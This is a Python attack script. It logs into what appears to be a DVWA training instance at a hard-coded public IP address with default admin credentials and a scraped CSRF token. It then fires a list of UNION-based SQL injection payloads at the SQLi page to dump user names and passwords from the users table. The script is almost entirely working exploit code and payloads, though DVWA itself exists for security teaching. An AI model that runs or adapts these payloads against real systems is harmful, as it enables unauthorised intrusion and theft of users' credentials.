
import requests
import re

url = "http://31.97.117.123/"
session = requests.Session()

# Login first
response = session.get(f"{url}login.php")
token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
csrf_token = token_match.group(1)

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": csrf_token,
    "Login": "Login"
}

session.post(f"{url}login.php", data=login_data)

# Check the SQLi page for user input functionality
print("[*] Checking SQLi vulnerability page...")
response = session.get(f"{url}vulnerabilities/sqli/")
print(f"Response length: {len(response.text)}")
print("\nSearching for form or input elements:")
if "<form" in response.text:
    print("[+] Found form")
    # Extract the form
    form_match = re.search(r"<form[^>]*>.*?</form>", response.text, re.DOTALL)
    if form_match:
        print(form_match.group(0)[:500])

# Look for user ID or search field
if "User ID" in response.text or "user_id" in response.text:
    print("\n[+] Found User ID field")
    
# Let's try to use SQL injection to extract all users
print("\n[*] Attempting SQL injection to extract users...")

# Common SQLi payload to dump data
payloads = [
    "1' UNION SELECT user_id, first_name, last_name, user, password FROM users--",
    "1' UNION SELECT user_id, first_name, last_name, user, password FROM dvwa.users--",
    "1 UNION SELECT user_id, first_name, last_name, user, password FROM users--",
    "1 UNION SELECT ALL user_id, first_name, last_name, user, password FROM users--",
]

for payload in payloads:
    try:
        # Try with GET parameter
        response = session.get(f"{url}vulnerabilities/sqli/?id={payload}&Submit=Submit")
        if "admin" in response.text or "first_name" in response.text.lower():
            print(f"[+] Payload worked: {payload}")
            print(f"Response preview:\n{response.text[1000:2000]}")
            break
    except Exception as e:
        print(f"[-] Error: {str(e)}")

